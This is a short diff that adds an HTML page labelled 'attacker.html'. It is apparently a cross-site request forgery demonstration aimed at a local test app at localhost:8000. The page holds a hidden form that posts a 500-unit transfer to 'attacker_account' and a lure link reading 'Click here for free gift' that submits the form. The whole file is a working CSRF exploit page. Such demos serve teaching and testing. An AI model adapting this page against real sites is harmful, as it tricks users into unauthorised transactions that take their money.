@@ -1,0 +1,14 @@
+<!-- attacker.html (served from another origin) -->
+<!doctype html>
+<html>
+  <body>
+    <form id="csrfForm" action="http://localhost:8000/transfer" method="POST">
+      <input type="hidden" name="to" value="attacker_account" />
+      <input type="hidden" name="amount" value="500" />
+    </form>
+
+    <a href="#" onclick="document.getElementById('csrfForm').submit(); return false;">
+      Click here for free gift
+    </a>
+  </body>
+</html>
